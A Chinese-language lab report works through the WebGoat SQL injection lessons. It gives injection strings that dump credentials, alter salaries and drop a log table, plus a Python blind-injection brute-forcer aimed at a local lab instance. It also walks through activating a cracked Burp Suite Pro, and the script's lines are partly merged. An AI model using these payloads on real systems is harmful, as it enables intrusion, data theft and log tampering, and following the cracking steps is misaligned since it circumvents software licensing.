# 第四章：渗透测试靶场实战
## WebGoat - A3 Injection - SQL Injection(intro)

### WebGoat
首先在WebGoat的github仓库复制仓库链接并在kali终端执行`git clone`拉包，然后在启动WebGoat容器

![web](./img_8/启动webgoat.png)

容器成功启动后，在虚拟机网页中打开相应的端口链接并且登录或注册账号（每一个注册的账号只在当前容器中有效，如果在之后的启动中重新构建启动了新的容器并且进入WebGoat浏览器页面，那么原先的账号和密码均无法使用）

![web](./img_8/在浏览器页面实现进入webgoat.png)

### SQL Injection (intro) - 2
#### 使用 SQL 查询

执行相关查询语句，查询employee表中tan为LO9S2V的员工的所属部门

`SELECT department FROM employees WHERE auth_tan='LO9S2V';`

![查询](./img_8/2.png)

### SQL Injection (intro) - 3

更改表中数据语句，更改employee表中tan值为TA9LL1的员工的部门为Salse

`UPDATE employees SET department = 'Sales' WHERE auth_tan='TA9LL1'`

![更改](./img_8/3.png)

### SQL Injection (intro) - 4

添加列表语句，向employee表中添加phone一列，且phone列的数据类型为小于等于20个字符的变长字符类型

`ALTER TABLE employees ADD phone varchar(20)`

![添加](./img_8/4.png)


### SQL Injection (intro) - 5

赋权语句，将所有权限授予用户unauthorized_user

`GRANT all ON grant_rights TO unauthorized_user`

![赋权](./img_8/5.png)

### SQL Injection (intro) - 6

**动手查看SQL拼接效果！**

![try](./img_8/6.png)

### SQL Injection (intro) - 7

**SQL 注入成功后你可以做什么？**

查看敏感信息，更改指定数据，更改权限，添加用户，删除日志等。


### SQL Injection (intro) - 8

**SQL 注入的严重性受哪些因素限制？**

* 攻击者的技巧和经验等。
* 被攻击数据库的安全防御层次是否合格。

### SQL Injection (intro) - 9

字符串型 SQL 注入
在这两个方法中，or前面的`'`和之前的last_name后面的`'`闭合，使得后面的`1=1`成为一个恒成立的条件，进而使SQL语句的查询条件变为所有记录
`
```
-- 1.
SELECT * FROM user_data WHERE first_name = 'John' and
last_name = '' or '1' = '1'
-- 2.
SELECT * FROM user_data WHERE first_name = 'John' and
last_name = 'Smith' or '1' = '1'
```

![injection](./img_8/9.png)

### SQL Injection (intro) - 10

数字型 SQL 注入

通过如图的语句结构可知数字型的SQL注入没有字符串的`'`闭合限制，而且数字SQL注入只对User_ID有效

![injection](./img_8/10.2.png)

直接构建or条件让其恒成立即可查询出所有记录

`SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1`

![injection](./img_8/10.1.png)

### SQL Injection (intro) - 11

使用字符串 SQL 注入损害机密性

同理，根据给出的语句结构可以构造出相应的注入语句

`3SL99A' or 1=1 --`

也可直接在Name一行注入，后面加上`--`注释掉后面拼接的内容即可。

![injection](./img_8/11.1.png)

![injection](./img_8/11.2.png)

### SQL Injection (intro) - 12

**通过查询链接损害完整性**
首先和之前的操作一样，先闭合左引号，然后再使用分号分隔指令，最后执行目标指令修改原数据库内容并注释掉后面会拼接的多余代码。

`3SL99A' or 1=1; UPDATE employees SET SALARY = '99999999' WHERE auth_tan='3SL99A'--`

![injection](./img_8/12.1.png)

![injection](./img_8/12.2.png)

### SQL Injection (intro) - 13

**影响可用性**
原理和上一个SQL注入一样，只不过这次是删除日志，清扫SQL注入的痕迹。

`or '; drop table access_log --`


![injection](./img_8/13.1.png)

![injection](./img_8/13.2.png)

## WebGoat - A3 Injection - SQL Injection(advanced) 1-3 

### SQL Injection (advanced) - 3

查询所有的信息
`Dave' UNION SELECT userid, user_name, password, cookie, null, null, null FROM user_system_data; --`



![injection](./img_8/16.1.png)

查询user_name为dave的记录，并找到对应的password或者直接从上一次查询的结果直接看出dave对应的password为passW0rD

![injection](./img_8/16.3.png)




## （扩展）完成 WebGoat - A3 Injection - SQL Injection(advanced) 4-6 盲注 部分
### 1. SQLmap的安装
    git clone https://github.com/sqlmapproject/sqlmap.git
通过该代码实现sqlmap的抓包和安装
### 2. 使用Burp suit抓取POST请求

![get](./img_8/exp3/1.png)

### 3. 将获取到的信息加入sqlmap命令所需的参数中进行分析

#### 3.1 方法一直接替换相关信息

 ![ans](./img_8/exp3/2.png)

但是该方法的分析结果是该数据库无法被注入攻击

#### 3.2 将截取的POST包写入一个txt文件中并直接再战sqlmap命令中读取文件以获得所需数据

  ![ans](./img_8/exp3/3.png)

该分析的结果是可注入攻击

### 4. 当想要进一步去获得数据库名称时，发现无法读取到数据库名称，可能是由于webgoat官方更新了相关内容，使得使用sqlmap无法进行注入

 ![injectfalse](./img_8/exp3/3.1.png)

### 5. Burpsuite Pro 激活及使用
#### 5.1  在`https://github.com/cyb3rzest/Burp-Suite-Pro`clone到本机后，执行命令启动脚本（注意要使用sudo提高权限执行脚本，否则可能会中途失败）

![clone](./img_8/exp3/burppro1.png)

#### 5.2 该步骤结束后，会自动执行两个jar文件并弹出两个窗口，将其中一个的key码复制到另外一个窗口中并点击next继续下一步

![key](./img_8/exp3/3.5.png)

#### 5.3 然后点击`Manual Activation Option`

![key](./img_8/exp3/3.6.png)

#### 5.4 将上一步窗口中的request复制到  Activation Request输入框内， Activation Response中会自动输出一段新的key码

![key](./img_8/exp3/3.7.png)

#### 5.5 将上一步新输出的那一段字符串复制到5.3步骤中的3.输入框中并点击next即可完成激活

![key](./img_8/exp3/3.8.png)


### 6. 使用repeater初步探测密码的长度
#### 6.1 先将之前进行注册时抓取的数据进行修改并重发，以检验密码的结构是否符合猜测，在这里使用的方法是尝试判断密码的长度区间，经过多次尝试，当猜测密码长度大于22个字符串时，response回应为already exists ，说明猜测为`true`

![inject](./img_8/exp3/4.0.png)

#### 6.2 同理，我们将猜测设为大于23时，发现response发生了改变，说明猜测为`false`，进而说明密码的长度为23位

![inject](./img_8/exp3/4.png)

### 7.当然也可以使用Intruder进行探测，来初步获取密码长度，将猜测密码长度的数字设置为可变量后并设置区间，进行攻击，根据结果的字符长度排序，并点击查看response内容，同样发现在长度为23时发生了突变，因此也可以确定密码长度为23位，并且该方法的速度和效率要高于6.中的方法。

![inject](./img_8/exp3/4.1.png)

### 8. 使用Intruder破解密码
#### 8.1 将原来的包内容进一步进行修改，并设置两个变量（注意这里还要将Attack type 更改为Cluster bomb，否则将无法修改第二个变量的信息），具体如图所示：

![inject](./img_8/exp3/5.1.png)

#### 8.2 其中一个是密码的下标所对应的位置，将其类型谁为number，范围是1到23

![inject](./img_8/exp3/5.2.png)

#### 8.3 另外一个是该位置所对应的字符，类型为Brute forcer,范围是26个英文字母

![inject](./img_8/exp3/5.3.png)

#### 8.4 一切就绪后开始攻击并将共计结果按照回应长度排序，可以发现，当长度为343时，response的结果出现`Already`，而这些条目中，Payload1对应的密码中的下标号，而Payload2则是该下标号对应的字符值，这里只给出了部分的密码内容，当然，通过修改之前攻击的参数，应该能够得到密码的所有位置内容。

![inject](./img_8/exp3/5.4.png)

![inject](./img_8/exp3/5.5.png)

### 9. 使用python脚本进行攻击，爆破密码
#### 9.1 使用到的脚本代码结构如下：
```
# coding:utf-8
import requests
#⽣成⼀个a-z的字⺟列表
str_list = [chr(i) for i in range(97,123)]
url ="http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge"password =""
#分别对24位按照a~z进⾏猜测
for i in range(1,24):
  for s in str_list:
  #使⽤i和s两个变量分别进⾏遍历
  putdata =f"username_reg=tom' and substring(password,{i},1)='{s}'--&email_reg=tom%40tom.com&password_reg=123&confirm_password_reg=123"burp0_url ="http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge"
  burp0_cookies = {"JSESSIONID":"pl3KGD5KboqpuWzNQj13qeUEAaRYcN1m6dTIwB68","SESS12ca17b49af2289436f303e0166030a2":"fZpnQ9GJoGXhdGIYFKnutXHkmyNyJfSUsM2JaGHutZk"}
  burp0_headers = {"User-Agent": "Mozilla/5.0 (X11;
  Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip,deflate, br", "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin":"http://127.0.0.1:8080", "Connection": "close", "Referer":"http://127.0.0.1:8080/WebGoat/start.mvc", "Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}
  res = requests.put(burp0_url, headers=burp0_headers,cookies=burp0_cookies, data=putdata)
  resp = res.text.find("already exists please")
  if resp != -1:
    password += s
print(password)
```
#### 9.2 但是注意，要将自己的Cookie值替换脚本中的Cookie

![inject](./img_8/exp3/code0.png)

#### 9.3 完成替换后执行py脚本，进行爆破攻击，将会得到密码的具体内容,观察密码可以发现，该密码和之前使用Intruder得到的部分密码相匹配，这也说明了之前的结果的正确性

![inject](./img_8/exp3/code.png)

### 验证密码
#### 将先前获取的密码输入登录界面

![check](./img_8/exp3/login.png)

#### 成功完成盲注

![success](./img_8/exp3/login1.png)

## 遇到的问题

大多都在报告中体现并解决

## 参考文献 
https://blog.csdn.net/Forever_Han13/article/details/122421287